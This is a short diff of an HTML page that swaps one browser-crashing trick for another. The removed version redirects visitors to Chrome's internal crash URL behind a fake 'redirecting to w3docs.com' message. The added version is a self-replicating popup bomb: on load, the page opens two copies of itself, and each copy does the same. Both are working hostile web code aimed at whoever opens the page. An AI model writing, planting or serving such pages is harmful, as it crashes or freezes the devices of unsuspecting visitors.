@@ -1,9 +1,7 @@
 <!DOCTYPE html>
 <html>
-  <head>
-    <meta http-equiv="refresh" content="7; url='chrome://inducebrowsercrashforrealz/'" />
-  </head>
-  <body>
-    <p>You will be redirected to w3docs.com soon!</p>
-  </body>
+  <script type="text/javascript"> 
+    function CrashAndBurn(url) { popupWindow = window.open( url,'popUpWindow','height=181,width=666,left=3,top=222') }
+  </script> 
+  <body onload="JavaScript:CrashAndBurn(self.location,'_blank');JavaScript:CrashAndBurn(self.location,'_blank');">
 </html>
